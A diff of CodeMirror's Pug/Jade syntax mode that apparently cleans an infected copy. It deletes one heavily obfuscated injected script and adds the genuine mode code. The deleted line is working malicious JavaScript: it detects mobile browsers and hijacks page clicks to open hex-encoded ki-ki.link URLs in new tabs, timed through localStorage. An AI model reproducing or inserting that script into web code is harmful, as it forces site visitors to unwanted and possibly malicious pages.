@@ -1,2 +1,591 @@
+// CodeMirror, copyright (c) by Marijn Haverbeke and others
+// Distributed under an MIT license: https://codemirror.net/LICENSE
 
-function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());
+(function(mod) {
+  if (typeof exports == "object" && typeof module == "object") // CommonJS
+    mod(require("../../lib/codemirror"), require("../javascript/javascript"), require("../css/css"), require("../htmlmixed/htmlmixed"));
+  else if (typeof define == "function" && define.amd) // AMD
+    define(["../../lib/codemirror", "../javascript/javascript", "../css/css", "../htmlmixed/htmlmixed"], mod);
+  else // Plain browser env
+    mod(CodeMirror);
+})(function(CodeMirror) {
+"use strict";
+
+CodeMirror.defineMode("pug", function (config) {
+  // token types
+  var KEYWORD = 'keyword';
+  var DOCTYPE = 'meta';
+  var ID = 'builtin';
+  var CLASS = 'qualifier';
+
+  var ATTRS_NEST = {
+    '{': '}',
+    '(': ')',
+    '[': ']'
+  };
+
+  var jsMode = CodeMirror.getMode(config, 'javascript');
+
+  function State() {
+    this.javaScriptLine = false;
+    this.javaScriptLineExcludesColon = false;
+
+    this.javaScriptArguments = false;
+    this.javaScriptArgumentsDepth = 0;
+
+    this.isInterpolating = false;
+    this.interpolationNesting = 0;
+
+    this.jsState = CodeMirror.startState(jsMode);
+
+    this.restOfLine = '';
+
+    this.isIncludeFiltered = false;
+    this.isEach = false;
+
+    this.lastTag = '';
+    this.scriptType = '';
+
+    // Attributes Mode
+    this.isAttrs = false;
+    this.attrsNest = [];
+    this.inAttributeName = true;
+    this.attributeIsType = false;
+    this.attrValue = '';
+
+    // Indented Mode
+    this.indentOf = Infinity;
+    this.indentToken = '';
+
+    this.innerMode = null;
+    this.innerState = null;
+
+    this.innerModeForLine = false;
+  }
+  /**
+   * Safely copy a state
+   *
+   * @return {State}
+   */
+  State.prototype.copy = function () {
+    var res = new State();
+    res.javaScriptLine = this.javaScriptLine;
+    res.javaScriptLineExcludesColon = this.javaScriptLineExcludesColon;
+    res.javaScriptArguments = this.javaScriptArguments;
+    res.javaScriptArgumentsDepth = this.javaScriptArgumentsDepth;
+    res.isInterpolating = this.isInterpolating;
+    res.interpolationNesting = this.interpolationNesting;
+
+    res.jsState = CodeMirror.copyState(jsMode, this.jsState);
+
+    res.innerMode = this.innerMode;
+    if (this.innerMode && this.innerState) {
+      res.innerState = CodeMirror.copyState(this.innerMode, this.innerState);
+    }
+
+    res.restOfLine = this.restOfLine;
+
+    res.isIncludeFiltered = this.isIncludeFiltered;
+    res.isEach = this.isEach;
+    res.lastTag = this.lastTag;
+    res.scriptType = this.scriptType;
+    res.isAttrs = this.isAttrs;
+    res.attrsNest = this.attrsNest.slice();
+    res.inAttributeName = this.inAttributeName;
+    res.attributeIsType = this.attributeIsType;
+    res.attrValue = this.attrValue;
+    res.indentOf = this.indentOf;
+    res.indentToken = this.indentToken;
+
+    res.innerModeForLine = this.innerModeForLine;
+
+    return res;
+  };
+
+  function javaScript(stream, state) {
+    if (stream.sol()) {
+      // if javaScriptLine was set at end of line, ignore it
+      state.javaScriptLine = false;
+      state.javaScriptLineExcludesColon = false;
+    }
+    if (state.javaScriptLine) {
+      if (state.javaScriptLineExcludesColon && stream.peek() === ':') {
+        state.javaScriptLine = false;
+        state.javaScriptLineExcludesColon = false;
+        return;
+      }
+      var tok = jsMode.token(stream, state.jsState);
+      if (stream.eol()) state.javaScriptLine = false;
+      return tok || true;
+    }
+  }
+  function javaScriptArguments(stream, state) {
+    if (state.javaScriptArguments) {
+      if (state.javaScriptArgumentsDepth === 0 && stream.peek() !== '(') {
+        state.javaScriptArguments = false;
+        return;
+      }
+      if (stream.peek() === '(') {
+        state.javaScriptArgumentsDepth++;
+      } else if (stream.peek() === ')') {
+        state.javaScriptArgumentsDepth--;
+      }
+      if (state.javaScriptArgumentsDepth === 0) {
+        state.javaScriptArguments = false;
+        return;
+      }
+
+      var tok = jsMode.token(stream, state.jsState);
+      return tok || true;
+    }
+  }
+
+  function yieldStatement(stream) {
+    if (stream.match(/^yield\b/)) {
+        return 'keyword';
+    }
+  }
+
+  function doctype(stream) {
+    if (stream.match(/^(?:doctype) *([^\n]+)?/)) {
+        return DOCTYPE;
+    }
+  }
+
+  function interpolation(stream, state) {
+    if (stream.match('#{')) {
+      state.isInterpolating = true;
+      state.interpolationNesting = 0;
+      return 'punctuation';
+    }
+  }
+
+  function interpolationContinued(stream, state) {
+    if (state.isInterpolating) {
+      if (stream.peek() === '}') {
+        state.interpolationNesting--;
+        if (state.interpolationNesting < 0) {
+          stream.next();
+          state.isInterpolating = false;
+          return 'punctuation';
+        }
+      } else if (stream.peek() === '{') {
+        state.interpolationNesting++;
+      }
+      return jsMode.token(stream, state.jsState) || true;
+    }
+  }
+
+  function caseStatement(stream, state) {
+    if (stream.match(/^case\b/)) {
+      state.javaScriptLine = true;
+      return KEYWORD;
+    }
+  }
+
+  function when(stream, state) {
+    if (stream.match(/^when\b/)) {
+      state.javaScriptLine = true;
+      state.javaScriptLineExcludesColon = true;
+      return KEYWORD;
+    }
+  }
+
+  function defaultStatement(stream) {
+    if (stream.match(/^default\b/)) {
+      return KEYWORD;
+    }
+  }
+
+  function extendsStatement(stream, state) {
+    if (stream.match(/^extends?\b/)) {
+      state.restOfLine = 'string';
+      return KEYWORD;
+    }
+  }
+
+  function append(stream, state) {
+    if (stream.match(/^append\b/)) {
+      state.restOfLine = 'variable';
+      return KEYWORD;
+    }
+  }
+  function prepend(stream, state) {
+    if (stream.match(/^prepend\b/)) {
+      state.restOfLine = 'variable';
+      return KEYWORD;
+    }
+  }
+  function block(stream, state) {
+    if (stream.match(/^block\b *(?:(prepend|append)\b)?/)) {
+      state.restOfLine = 'variable';
+      return KEYWORD;
+    }
+  }
+
+  function include(stream, state) {
+    if (stream.match(/^include\b/)) {
+      state.restOfLine = 'string';
+      return KEYWORD;
+    }
+  }
+
+  function includeFiltered(stream, state) {
+    if (stream.match(/^include:([a-zA-Z0-9\-]+)/, false) && stream.match('include')) {
+      state.isIncludeFiltered = true;
+      return KEYWORD;
+    }
+  }
+
+  function includeFilteredContinued(stream, state) {
+    if (state.isIncludeFiltered) {
+      var tok = filter(stream, state);
+      state.isIncludeFiltered = false;
+      state.restOfLine = 'string';
+      return tok;
+    }
+  }
+
+  function mixin(stream, state) {
+    if (stream.match(/^mixin\b/)) {
+      state.javaScriptLine = true;
+      return KEYWORD;
+    }
+  }
+
+  function call(stream, state) {
+    if (stream.match(/^\+([-\w]+)/)) {
+      if (!stream.match(/^\( *[-\w]+ *=/, false)) {
+        state.javaScriptArguments = true;
+        state.javaScriptArgumentsDepth = 0;
+      }
+      return 'variable';
+    }
+    if (stream.match('+#{', false)) {
+      stream.next();
+      state.mixinCallAfter = true;
+      return interpolation(stream, state);
+    }
+  }
+  function callArguments(stream, state) {
+    if (state.mixinCallAfter) {
+      state.mixinCallAfter = false;
+      if (!stream.match(/^\( *[-\w]+ *=/, false)) {
+        state.javaScriptArguments = true;
+        state.javaScriptArgumentsDepth = 0;
+      }
+      return true;
+    }
+  }
+
+  function conditional(stream, state) {
+    if (stream.match(/^(if|unless|else if|else)\b/)) {
+      state.javaScriptLine = true;
+      return KEYWORD;
+    }
+  }
+
+  function each(stream, state) {
+    if (stream.match(/^(- *)?(each|for)\b/)) {
+      state.isEach = true;
+      return KEYWORD;
+    }
+  }
+  function eachContinued(stream, state) {
+    if (state.isEach) {
+      if (stream.match(/^ in\b/)) {
+        state.javaScriptLine = true;
+        state.isEach = false;
+        return KEYWORD;
+      } else if (stream.sol() || stream.eol()) {
+        state.isEach = false;
+      } else if (stream.next()) {
+        while (!stream.match(/^ in\b/, false) && stream.next());
+        return 'variable';
+      }
+    }
+  }
+
+  function whileStatement(stream, state) {
+    if (stream.match(/^while\b/)) {
+      state.javaScriptLine = true;
+      return KEYWORD;
+    }
+  }
+
+  function tag(stream, state) {
+    var captures;
+    if (captures = stream.match(/^(\w(?:[-:\w]*\w)?)\/?/)) {
+      state.lastTag = captures[1].toLowerCase();
+      if (state.lastTag === 'script') {
+        state.scriptType = 'application/javascript';
+      }
+      return 'tag';
+    }
+  }
+
+  function filter(stream, state) {
+    if (stream.match(/^:([\w\-]+)/)) {
+      var innerMode;
+      if (config && config.innerModes) {
+        innerMode = config.innerModes(stream.current().substring(1));
+      }
+      if (!innerMode) {
+        innerMode = stream.current().substring(1);
+      }
+      if (typeof innerMode === 'string') {
+        innerMode = CodeMirror.getMode(config, innerMode);
+      }
+      setInnerMode(stream, state, innerMode);
+      return 'atom';
+    }
+  }
+
+  function code(stream, state) {
+    if (stream.match(/^(!?=|-)/)) {
+      state.javaScriptLine = true;
+      return 'punctuation';
+    }
+  }
+
+  function id(stream) {
+    if (stream.match(/^#([\w-]+)/)) {
+      return ID;
+    }
+  }
+
+  function className(stream) {
+    if (stream.match(/^\.([\w-]+)/)) {
+      return CLASS;
+    }
+  }
+
+  function attrs(stream, state) {
+    if (stream.peek() == '(') {
+      stream.next();
+      state.isAttrs = true;
+      state.attrsNest = [];
+      state.inAttributeName = true;
+      state.attrValue = '';
+      state.attributeIsType = false;
+      return 'punctuation';
+    }
+  }
+
+  function attrsContinued(stream, state) {
+    if (state.isAttrs) {
+      if (ATTRS_NEST[stream.peek()]) {
+        state.attrsNest.push(ATTRS_NEST[stream.peek()]);
+      }
+      if (state.attrsNest[state.attrsNest.length - 1] === stream.peek()) {
+        state.attrsNest.pop();
+      } else  if (stream.eat(')')) {
+        state.isAttrs = false;
+        return 'punctuation';
+      }
+      if (state.inAttributeName && stream.match(/^[^=,\)!]+/)) {
+        if (stream.peek() === '=' || stream.peek() === '!') {
+          state.inAttributeName = false;
+          state.jsState = CodeMirror.startState(jsMode);
+          if (state.lastTag === 'script' && stream.current().trim().toLowerCase() === 'type') {
+            state.attributeIsType = true;
+          } else {
+            state.attributeIsType = false;
+          }
+        }
+        return 'attribute';
+      }
+
+      var tok = jsMode.token(stream, state.jsState);
+      if (state.attributeIsType && tok === 'string') {
+        state.scriptType = stream.current().toString();
+      }
+      if (state.attrsNest.length === 0 && (tok === 'string' || tok === 'variable' || tok === 'keyword')) {
+        try {
+          Function('', 'var x ' + state.attrValue.replace(/,\s*$/, '').replace(/^!/, ''));
+          state.inAttributeName = true;
+          state.attrValue = '';
+          stream.backUp(stream.current().length);
+          return attrsContinued(stream, state);
+        } catch (ex) {
+          //not the end of an attribute
+        }
+      }
+      state.attrValue += stream.current();
+      return tok || true;
+    }
+  }
+
+  function attributesBlock(stream, state) {
+    if (stream.match(/^&attributes\b/)) {
+      state.javaScriptArguments = true;
+      state.javaScriptArgumentsDepth = 0;
+      return 'keyword';
+    }
+  }
+
+  function indent(stream) {
+    if (stream.sol() && stream.eatSpace()) {
+      return 'indent';
+    }
+  }
+
+  function comment(stream, state) {
+    if (stream.match(/^ *\/\/(-)?([^\n]*)/)) {
+      state.indentOf = stream.indentation();
+      state.indentToken = 'comment';
+      return 'comment';
+    }
+  }
+
+  function colon(stream) {
+    if (stream.match(/^: */)) {
+      return 'colon';
+    }
+  }
+
+  function text(stream, state) {
+    if (stream.match(/^(?:\| ?| )([^\n]+)/)) {
+      return 'string';
+    }
+    if (stream.match(/^(<[^\n]*)/, false)) {
+      // html string
+      setInnerMode(stream, state, 'htmlmixed');
+      state.innerModeForLine = true;
+      return innerMode(stream, state, true);
+    }
+  }
+
+  function dot(stream, state) {
+    if (stream.eat('.')) {
+      var innerMode = null;
+      if (state.lastTag === 'script' && state.scriptType.toLowerCase().indexOf('javascript') != -1) {
+        innerMode = state.scriptType.toLowerCase().replace(/"|'/g, '');
+      } else if (state.lastTag === 'style') {
+        innerMode = 'css';
+      }
+      setInnerMode(stream, state, innerMode);
+      return 'dot';
+    }
+  }
+
+  function fail(stream) {
+    stream.next();
+    return null;
+  }
+
+
+  function setInnerMode(stream, state, mode) {
+    mode = CodeMirror.mimeModes[mode] || mode;
+    mode = config.innerModes ? config.innerModes(mode) || mode : mode;
+    mode = CodeMirror.mimeModes[mode] || mode;
+    mode = CodeMirror.getMode(config, mode);
+    state.indentOf = stream.indentation();
+
+    if (mode && mode.name !== 'null') {
+      state.innerMode = mode;
+    } else {
+      state.indentToken = 'string';
+    }
+  }
+  function innerMode(stream, state, force) {
+    if (stream.indentation() > state.indentOf || (state.innerModeForLine && !stream.sol()) || force) {
+      if (state.innerMode) {
+        if (!state.innerState) {
+          state.innerState = state.innerMode.startState ? CodeMirror.startState(state.innerMode, stream.indentation()) : {};
+        }
+        return stream.hideFirstChars(state.indentOf + 2, function () {
+          return state.innerMode.token(stream, state.innerState) || true;
+        });
+      } else {
+        stream.skipToEnd();
+        return state.indentToken;
+      }
+    } else if (stream.sol()) {
+      state.indentOf = Infinity;
+      state.indentToken = null;
+      state.innerMode = null;
+      state.innerState = null;
+    }
+  }
+  function restOfLine(stream, state) {
+    if (stream.sol()) {
+      // if restOfLine was set at end of line, ignore it
+      state.restOfLine = '';
+    }
+    if (state.restOfLine) {
+      stream.skipToEnd();
+      var tok = state.restOfLine;
+      state.restOfLine = '';
+      return tok;
+    }
+  }
+
+
+  function startState() {
+    return new State();
+  }
+  function copyState(state) {
+    return state.copy();
+  }
+  /**
+   * Get the next token in the stream
+   *
+   * @param {Stream} stream
+   * @param {State} state
+   */
+  function nextToken(stream, state) {
+    var tok = innerMode(stream, state)
+      || restOfLine(stream, state)
+      || interpolationContinued(stream, state)
+      || includeFilteredContinued(stream, state)
+      || eachContinued(stream, state)
+      || attrsContinued(stream, state)
+      || javaScript(stream, state)
+      || javaScriptArguments(stream, state)
+      || callArguments(stream, state)
+
+      || yieldStatement(stream)
+      || doctype(stream)
+      || interpolation(stream, state)
+      || caseStatement(stream, state)
+      || when(stream, state)
+      || defaultStatement(stream)
+      || extendsStatement(stream, state)
+      || append(stream, state)
+      || prepend(stream, state)
+      || block(stream, state)
+      || include(stream, state)
+      || includeFiltered(stream, state)
+      || mixin(stream, state)
+      || call(stream, state)
+      || conditional(stream, state)
+      || each(stream, state)
+      || whileStatement(stream, state)
+      || tag(stream, state)
+      || filter(stream, state)
+      || code(stream, state)
+      || id(stream)
+      || className(stream)
+      || attrs(stream, state)
+      || attributesBlock(stream, state)
+      || indent(stream)
+      || text(stream, state)
+      || comment(stream, state)
+      || colon(stream)
+      || dot(stream, state)
+      || fail(stream);
+
+    return tok === true ? null : tok;
+  }
+  return {
+    startState: startState,
+    copyState: copyState,
+    token: nextToken
+  };
+}, 'javascript', 'css', 'htmlmixed');
+
+CodeMirror.defineMIME('text/x-pug', 'pug');
+CodeMirror.defineMIME('text/x-jade', 'pug');
+
+});
